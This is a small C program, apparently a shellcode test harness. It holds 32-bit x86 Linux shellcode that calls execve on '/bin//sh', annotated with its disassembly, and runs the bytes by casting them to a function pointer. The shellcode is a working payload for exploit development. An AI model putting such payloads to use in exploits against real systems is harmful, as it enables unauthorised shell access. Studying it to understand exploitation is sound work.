#include <stdlib.h>
#include <stdio.h>

/*
 *  \x31\xc0                // xor    %eax,%eax
 *  \x50                    // push   %eax
 *  \x68\x2f\x2f\x73\x68    // push   $0x68732f2f
 *  \x68\x2f\x62\x69\x6e    // push   $0x6e69622f
 *  \x89\xe3                // mov    %esp,%ebx
 *  \x50                    // push   %eax
 *  \x53                    // push   %ebx
 *  \x89\xe1                // mov    %esp,%ecx
 *  \x99                    // cltd
 * 	\xb0\x0b                // mov    $0xb,%al
 *  \xcd\x80                // int    $0x80
 */

const char code[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                    "\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char ** argv)
{
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();

    return 0;
}

